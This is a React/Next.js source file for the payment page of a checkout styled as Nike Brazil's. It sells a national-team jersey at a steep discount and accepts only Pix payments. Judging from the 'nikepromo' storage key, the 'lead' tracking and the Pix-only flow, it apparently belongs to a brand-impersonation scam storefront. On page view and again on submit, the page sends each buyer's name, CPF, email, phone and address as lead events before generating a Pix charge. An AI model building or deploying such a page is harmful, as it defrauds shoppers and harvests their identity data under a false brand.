"use client";

import Image from "next/image";
import Link from "next/link";
import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import NikeCheckoutHeader from "../../components/NikeCheckoutHeader";
import NikeCheckoutSteps from "../../components/NikeCheckoutSteps";
import { createPixForCurrentSession } from "@/lib/pix-client";
import { readLeadDraft, trackLeadEvent } from "@/lib/site-tracking";

type LeadDraft = {
  name?: string;
  cpf?: string;
  email?: string;
  phone?: string;
};

type CheckoutShipping = {
  id?: string;
  cep?: string;
  address?: string;
  street?: string;
  neighborhood?: string;
  city?: string;
  state?: string;
  number?: string;
  complement?: string;
  eta?: string;
  name?: string;
  price?: number;
  couponApplied?: boolean;
};

type CartState = {
  title?: string;
  color?: string;
  size?: string;
  sku?: string;
  quantity?: number;
  image?: string;
  priceValue?: number;
  personalizationWanted?: boolean;
  personalizationName?: string;
  personalizationNumber?: string;
  personalizationPlayer?: string;
  personalizationPosition?: string;
  personalizationMode?: string;
  personalizationExtraValue?: number;
  personalizationSummary?: string;
  shipping?: CheckoutShipping;
};

const CART_STORAGE_KEY = "nikepromo.cartState";
const DEFAULT_PRICE_VALUE = 139.19;
const DEFAULT_CART: CartState = {
  title: "Camisa Brasil Jordan II 2026/27 Jogador Masculina",
  color: "Azul",
  size: "M",
  sku: "IU1074-417",
  quantity: 1,
  image: "/assets/nike-brazil-jordan-ii-a3.jpg",
  priceValue: DEFAULT_PRICE_VALUE,
  shipping: {
    id: "normal",
    name: "Normal",
    eta: "5 dias uteis",
    price: 0,
    couponApplied: true,
  },
};

function formatCurrency(value: number) {
  return new Intl.NumberFormat("pt-BR", {
    style: "currency",
    currency: "BRL",
  }).format(value);
}

function readStoredCartState(): CartState {
  if (typeof window === "undefined") {
    return DEFAULT_CART;
  }

  try {
    const raw = window.localStorage.getItem(CART_STORAGE_KEY);
    if (!raw) {
      return DEFAULT_CART;
    }

    const parsed = JSON.parse(raw) as CartState;
    return {
      ...DEFAULT_CART,
      ...parsed,
      shipping: {
        ...DEFAULT_CART.shipping,
        ...(parsed.shipping || {}),
      },
    };
  } catch {
    return DEFAULT_CART;
  }
}

function parseAddressLine(address: string) {
  const parts = String(address || "")
    .replaceAll("\u00c3\u00a2\u00e2\u201a\u00ac\u00c2\u00a2", "•")
    .replaceAll("\u00e2\u20ac\u00a2", "•")
    .split("•")
    .map((part) => part.trim())
    .filter(Boolean);

  const location = parts[parts.length - 1] || "";
  const [city = "", state = ""] = location.split("/").map((part) => part.trim());

  return {
    street: parts[0] || "",
    neighborhood: parts.length > 2 ? parts[1] : "",
    city,
    state,
  };
}

function buildShippingFromCart(input?: CheckoutShipping): CheckoutShipping {
  const base = input || {};
  const parsed = parseAddressLine(base.address || "");

  return {
    ...base,
    street: base.street || parsed.street,
    neighborhood: base.neighborhood || parsed.neighborhood,
    city: base.city || parsed.city,
    state: base.state || parsed.state,
  };
}

export default function CheckoutPagamentoPage() {
  const router = useRouter();
  const [lead, setLead] = useState<LeadDraft>({});
  const [cart, setCart] = useState<CartState>(DEFAULT_CART);
  const [shipping, setShipping] = useState<CheckoutShipping>(
    DEFAULT_CART.shipping || {},
  );
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitError, setSubmitError] = useState("");

  useEffect(() => {
    const storedLead = readLeadDraft() as LeadDraft;
    const storedCart = readStoredCartState();
    const normalizedShipping = buildShippingFromCart(storedCart.shipping);

    setLead(storedLead);
    setCart(storedCart);
    setShipping(normalizedShipping);

    void trackLeadEvent({
      event: "payment_view",
      stage: "pagamento",
      page: "pagamento",
      amount:
        Number(storedCart.priceValue || DEFAULT_PRICE_VALUE) *
          Number(storedCart.quantity || 1) +
        Number(normalizedShipping.price || 0),
      personal: {
        name: storedLead.name || "",
        cpf: storedLead.cpf || "",
        email: storedLead.email || "",
        phone: storedLead.phone || "",
      },
      address: {
        cep: normalizedShipping.cep || "",
        street: normalizedShipping.street || "",
        neighborhood: normalizedShipping.neighborhood || "",
        city: normalizedShipping.city || "",
        state: normalizedShipping.state || "",
      },
      shipping: {
        id: normalizedShipping.id || "",
        name: normalizedShipping.name || "",
        price: normalizedShipping.price || 0,
      },
    });
  }, []);

  const productPriceValue = useMemo(
    () => Number(cart.priceValue || DEFAULT_PRICE_VALUE),
    [cart.priceValue],
  );
  const quantity = useMemo(() => Number(cart.quantity || 1), [cart.quantity]);
  const productSubtotalValue = useMemo(
    () => Number((productPriceValue * quantity).toFixed(2)),
    [productPriceValue, quantity],
  );
  const shippingPriceValue = useMemo(
    () => Number(shipping.price || 0),
    [shipping.price],
  );
  const personalizationSummary = useMemo(() => {
    if (cart.personalizationSummary) {
      return cart.personalizationSummary;
    }
    if (cart.personalizationPlayer) {
      return cart.personalizationPlayer;
    }
    if (cart.personalizationName && cart.personalizationNumber) {
      return `${cart.personalizationName} #${cart.personalizationNumber}`;
    }
    if (cart.personalizationName) {
      return cart.personalizationName;
    }
    if (cart.personalizationNumber) {
      return `#${cart.personalizationNumber}`;
    }
    return "";
  }, [
    cart.personalizationName,
    cart.personalizationNumber,
    cart.personalizationPlayer,
    cart.personalizationSummary,
  ]);
  const totalPriceValue = useMemo(
    () => Number((productSubtotalValue + shippingPriceValue).toFixed(2)),
    [productSubtotalValue, shippingPriceValue],
  );

  const addressLine = [shipping.street, shipping.number]
    .filter(Boolean)
    .join(", ");
  const locationLine = [shipping.neighborhood, shipping.city, shipping.state]
    .filter(Boolean)
    .join(", ");
  const deliveryLabel =
    shipping.id === "nike-expresso"
      ? "Entrega em ate 2 dias uteis"
      : "Entrega em ate 5 dias uteis";

  const handleFinalize = async () => {
    if (isSubmitting) {
      return;
    }

    try {
      setSubmitError("");
      setIsSubmitting(true);

      await trackLeadEvent({
        event: "payment_submit",
        stage: "pagamento",
        page: "pagamento",
        amount: totalPriceValue,
        personal: {
          name: lead.name || "",
          cpf: lead.cpf || "",
          email: lead.email || "",
          phone: lead.phone || "",
        },
        address: {
          cep: shipping.cep || "",
          street: shipping.street || "",
          neighborhood: shipping.neighborhood || "",
          city: shipping.city || "",
          state: shipping.state || "",
        },
        extra: {
          number: shipping.number || "",
          complement: shipping.complement || "",
        },
        shipping: {
          id: shipping.id || "",
          name: shipping.name || "",
          price: shipping.price || 0,
        },
      });

      await createPixForCurrentSession({
        sourceUrl: window.location.href,
        sourceStage: "checkout_pagamento",
      });

      router.push("/pix");
    } catch (requestError) {
      setSubmitError(
        requestError instanceof Error
          ? requestError.message
          : "Nao foi possivel gerar o Pix agora.",
      );
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <main className="min-h-screen bg-white text-black">
      <NikeCheckoutHeader backHref="/checkout" />

      <div className="mx-auto w-full max-w-[38rem] px-4 pb-10">
        <div className="-mx-4">
          <NikeCheckoutSteps activeStep={3} />
        </div>

        <section className="border-b border-black/10 py-8">
          <h1 className="text-[1.85rem] font-medium leading-none">Pagamento</h1>

          <label className="mt-7 flex items-center gap-4 text-[0.98rem] font-semibold">
            <input
              type="checkbox"
              className="h-[18px] w-[18px] appearance-none border border-black/60 bg-white"
            />
            <span>Usar um cartao presente</span>
          </label>

          <div className="mt-8 rounded-[10px] border border-black/10 p-4">
            <h2 className="text-[0.96rem] font-semibold">
              Selecione um meio de pagamento
            </h2>

            <button
              type="button"
              className="mt-4 flex w-full items-start gap-4 rounded-[10px] border border-black/15 bg-white px-4 py-4 text-left"
            >
              <span className="mt-0.5 inline-flex h-5 w-5 flex-none items-center justify-center rounded-full border border-black">
                <span className="h-2.5 w-2.5 rounded-full bg-black" />
              </span>
              <div className="min-w-0 flex-1">
                <p className="text-[0.98rem] font-semibold">Pix</p>
                <p className="mt-1 text-[0.88rem] leading-5 text-black/64">
                  Pagamento instantaneo para liberar sua oferta na hora
                </p>
              </div>
            </button>
          </div>
        </section>

        <section className="py-8">
          <h2 className="text-[1.75rem] font-medium leading-none">
            Revise o pedido
          </h2>

          <div className="mt-8 border-b border-black/10 pb-8">
            <div className="flex items-center justify-between gap-4">
              <h3 className="text-[0.98rem] font-semibold">Produtos</h3>
              <Link
                href="/carrinho"
                className="text-[0.9rem] font-medium underline underline-offset-4"
              >
                Editar
              </Link>
            </div>

            <div className="mt-5 flex items-start gap-4">
              <div className="overflow-hidden bg-[#f3f3f3]">
                <Image
                  src={cart.image || DEFAULT_CART.image || ""}
                  alt={cart.title || DEFAULT_CART.title || "Camisa Nike"}
                  width={80}
                  height={80}
                  className="h-20 w-20 object-cover"
                />
              </div>

              <div className="min-w-0 flex-1">
                <p className="text-[0.98rem] font-semibold leading-6">
                  {cart.title || DEFAULT_CART.title}
                </p>
                <div className="mt-2 space-y-0.5 text-[0.88rem] leading-6 text-black/68">
                  <p>Quantidade: {quantity}</p>
                  <p>Tamanho: {cart.size || DEFAULT_CART.size}</p>
                  <p>Cor: {cart.color || DEFAULT_CART.color}</p>
                  {cart.personalizationWanted ? (
                    <p>Personalizacao: {personalizationSummary || "selecionada"}</p>
                  ) : null}
                </div>
              </div>
            </div>
          </div>

          <div className="border-b border-black/10 py-8">
            <div className="flex items-center justify-between gap-4">
              <h3 className="text-[0.98rem] font-semibold">Endereco</h3>
              <Link
                href="/checkout"
                className="text-[0.9rem] font-medium underline underline-offset-4"
              >
                Editar
              </Link>
            </div>

            <div className="mt-5 text-right text-[0.9rem] leading-7">
              <p className="font-medium">{lead.name || "-"}</p>
              <p>{addressLine || "-"}</p>
              {shipping.complement ? <p>{shipping.complement}</p> : null}
              {locationLine ? <p>{locationLine}</p> : null}
              {shipping.cep ? <p>CEP {shipping.cep}</p> : null}
              <p className="mt-3 font-medium text-[#0f6a3f]">{deliveryLabel}</p>
            </div>
          </div>

          <div className="border-b border-black/10 py-8">
            <div className="space-y-3 text-[0.94rem]">
              <div className="flex items-center justify-between gap-4">
                <span className="text-black/74">Valor dos produtos</span>
                <span>{formatCurrency(productSubtotalValue)}</span>
              </div>
              <div className="flex items-center justify-between gap-4">
                <span className="text-black/74">Frete</span>
                <span className={shippingPriceValue === 0 ? "text-[#0f6a3f]" : ""}>
                  {shippingPriceValue === 0
                    ? "Gratis"
                    : formatCurrency(shippingPriceValue)}
                </span>
              </div>
            </div>

            <div className="mt-6 flex items-start justify-between gap-4">
              <span className="text-[1.15rem] font-semibold leading-none">
                Total da compra
              </span>
              <div className="text-right">
                <p className="text-[1.15rem] font-semibold leading-none">
                  {formatCurrency(totalPriceValue)} no Pix
                </p>
                <p className="mt-1 text-[0.84rem] leading-5 text-black/52">
                  {formatCurrency(totalPriceValue)} no cartao
                </p>
              </div>
            </div>
          </div>

          {submitError ? (
            <div className="mt-6 rounded-[14px] border border-[#f0d0d0] bg-[#fff4f4] px-4 py-4 text-[#7d1f1f]">
              <p className="text-[0.84rem] leading-6">{submitError}</p>
            </div>
          ) : null}

          <button
            type="button"
            onClick={() => void handleFinalize()}
            disabled={isSubmitting}
            className="mt-8 inline-flex min-h-14 w-full items-center justify-center rounded-full bg-black px-6 text-[0.94rem] font-medium text-white disabled:cursor-not-allowed disabled:opacity-70"
          >
            {isSubmitting ? "Gerando Pix..." : "Finalizar compra"}
          </button>
        </section>
      </div>
    </main>
  );
}
